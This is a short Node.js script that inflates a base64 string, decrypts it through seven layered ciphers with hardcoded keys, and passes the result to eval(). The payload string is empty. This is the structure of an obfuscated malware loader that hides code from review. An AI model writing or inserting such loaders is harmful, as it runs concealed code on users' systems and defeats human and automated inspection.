
const crypto = require('crypto');
const zlib = require('zlib');
const ivs = ["9efce05845e2dee3997ec7775dbc1ec3","1d6296cfe9b59ad872d58cac586e9ed1","68abe60cdf405f4cb947c5eafb58b84d","c01bf08edd7fd5a7","d6bbf8ea0a4dcdf3","b192123902868191","8f20a23b65ed1e6c"];
const keys = ["d68fe182d0275ff1b69721e3e330beda08f53150ec41e09d942286e962337fa2","db3cd1fdad60ac1e2d7040c12ad5306c31b81664ccc01e46","0293a95fc7e8c4da406c5df494800823","fef0128158d69191557c31631ba8238b","3e41eab6362ec78b8163e98d468bbf05","b49c2be7b752d935","0c2f47227a2ebd5f212cf01396aad8e6688f65af393b70bd"];
const algorithms = ["aes-256-cbc","aes-192-cbc","aes-128-cbc","bf-cbc","cast5-cbc","des-cbc","des-ede3-cbc"];

function decryptText(encryptedText, algorithms, ivs, keys) {
    try {
        let decryptedText = zlib.inflateSync(Buffer.from(encryptedText, 'base64'));
        for (let i = algorithms.length - 1; i >= 0; i--) {
            const decipher = crypto.createDecipheriv(algorithms[i], Buffer.from(keys[i], 'hex'), Buffer.from(ivs[i], 'hex'));
            decryptedText = Buffer.concat([decipher.update(decryptedText), decipher.final()]);
        }
        return decryptedText.toString('utf8');
    } catch (error) {
        throw new Error('Error decrypting the text: ' + error.message);
    }
}

const encryptedCode = "";
eval(decryptText(encryptedCode, algorithms, ivs, keys));
